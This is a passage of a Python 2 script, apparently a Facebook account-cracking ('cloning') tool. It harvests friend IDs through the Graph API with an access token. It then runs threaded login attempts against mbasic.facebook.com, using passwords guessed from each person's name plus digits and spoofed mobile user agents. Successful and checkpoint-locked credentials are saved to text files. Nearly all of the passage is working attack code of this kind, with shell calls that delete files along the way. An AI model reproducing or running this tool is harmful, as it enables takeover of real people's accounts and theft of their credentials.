    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    os.system('rm -rf newlinks.txt')
    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
    os.system('rm -rf kk.txt')
    os.system('rm -rf jok.txt')
    os.system('clear')
    print logo
    print ""
    try:
        for line in open("newlinks.txt",'r').readlines():
            idx.append(line.strip())
    except:
        fb_menu()
    print "[!] total ids : "+str(len(idx))
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    print "\033[1;91m   cracking start please wait ..   "
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        myagents=random.choice(['Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                ok=open('SUBHAN-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                    cp=open('SUBHAN-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = ps1
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                        ok=open('SUBHAN-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass2
                            cp=open('SUBHAN-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = ps2
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass3
                                ok=open('SUBHAN-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[SUBHAN-OK] "+uid + " | " + pass3
                                    cp=open('SUBHAN-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = ps3
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass4
                                        ok=open('SUBHAN-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass4
                                            cp=open('SUBHAN-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = ps4
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass5
                                                ok=open('SUBHAN-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;97m[SUBHAN-CP] "+uid + " | " + pass5
                                                    cp=open('SUBHAN-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;97m"
    print 39*'-'
    print "[!] cloning complete result ........"
    print 39*'-'
    print '[!] Total Ok Ids : '+str(len(oks))
    print '[!] Total Cp Ids : '+str(len(cps))
    print 39*'-'
    print ''
    raw_input(' Press Enter To Back ')
    fb_menu()






def xoknp():
    os.system("rm -rf kk.txt")
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print logo
    print ""
    iiid=raw_input("[1] Enter ID : ")
    print ""
    ps1=raw_input('[1] name + digit : ')
    ps2=raw_input('[2] name + digit : ')
    ps3=raw_input('[3] name + digit : ')
    ps4=raw_input('[4] last + name  : ')
    print ""
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends"
    print ""
    time.sleep(2)
    print g+"[=] Transfer Complte Process Start *"+w
    print ""
    os.system(' cat look.txt | grep "10000" >> kk.txt')
    os.system(' cat look.txt | grep "1000" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    os.system('rm -rf newlinks.txt')
    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
    os.system('rm -rf kk.txt')
    os.system('rm -rf jok.txt')
    os.system('clear')
    print logo
    print ""
    try:
        for line in open("newlinks.txt",'r').readlines():
            idx.append(line.strip())
    except:
        fb_menu()
    print "[!] total ids : "+str(len(idx))
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    print "\033[1;91m    cracking start please wait ..   "
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        myagents=random.choice(['Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                ok=open('SUBHAN-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                    cp=open('SUBHAN-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+ps1
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                        ok=open('SUBHAN-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass2
                            cp=open('SUBHAN-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+ps2
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass3
                                ok=open('SUBHAN-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass3
                                    cp=open('SUBHAN-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+ps3
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass4
                                        ok=open('SUBHAN-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass4
                                            cp=open('SUBHAN-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = last+ps4
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
